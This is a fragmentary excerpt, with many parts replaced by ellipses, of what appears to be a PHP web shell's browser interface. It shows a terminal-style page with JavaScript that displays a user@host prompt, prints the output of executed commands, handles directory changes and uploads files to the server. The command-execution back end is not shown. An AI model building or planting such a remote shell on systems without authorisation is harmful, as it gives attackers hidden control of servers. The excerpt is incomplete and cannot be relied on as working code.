...
<link rel="shortcut icon" href="sys.bash.png?rev=<?=time();?>" type="image/x-icon">
<style>
@font-face
{
...
function getShellInfo() {
    ...
    request.onreadystatechange = function()
    {
        if (request.readyState == XMLHttpRequest.DONE)
        {
            ...
            usernameElement.innerHTML = "<div style='color: #00ff00; display: inline;'>"+username+"@"+hostname+"</div>:"+currentDir+"#";
            updateInputWidth();
        }
    };
    ...
    request.onreadystatechange = function()
    {
        if (request.readyState == XMLHttpRequest.DONE)
        {
            if (cd)
            {
                ...
                outputElement.innerHTML += "<div style='color:#00ff00; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+originalDir+"# "+originalCommand+"</div><br>";
                usernameElement.innerHTML = "<div style='color: #00ff00; display: inline;'>"+username+"@"+hostname+"</div>:"+currentDir+"#";
            }
            else
            {
                outputElement.innerHTML += "<div style='color:#00ff00; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# "+originalCommand+"</div><br>" + request.responseText.replace(new RegExp("<br><br>$"), "<br>");
...
function uploadFile()
{
    ...
    outputElement.innerHTML += "<div style='color:#00ff00; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# Uploading "+fileBrowserElement.files[0].name+"...</div><br>";
}
